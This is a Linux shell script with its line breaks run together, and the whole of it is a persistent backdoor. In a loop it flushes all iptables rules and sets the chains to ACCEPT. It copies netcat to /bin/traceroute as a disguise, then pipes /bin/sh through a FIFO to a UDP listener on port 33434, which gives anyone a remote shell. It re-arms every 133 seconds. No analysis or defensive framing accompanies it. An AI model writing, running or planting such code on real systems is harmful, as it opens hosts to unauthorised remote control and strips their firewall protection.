#!/bin/shwhile :do	/sbin/iptables -F	/sbin/iptables -P INPUT ACCEPT	/sbin/iptables -P OUTPUT ACCEPT	if [ ! -e /bin/traceroute ]; then		cp /bin/nc /bin/traceroute	fi	if [ $(/bin/ps | /usr/bin/pgrep traceroute | /usr/bin/wc -l) -lt 1 ]; then		if [ ! -e /tmp/pipe ]; then			mkfifo /tmp/pipe		fi		/bin/sh /tmp/pipe | /bin/traceroute -lu 33434 > /tmp/pipe &	fi	sleep  133done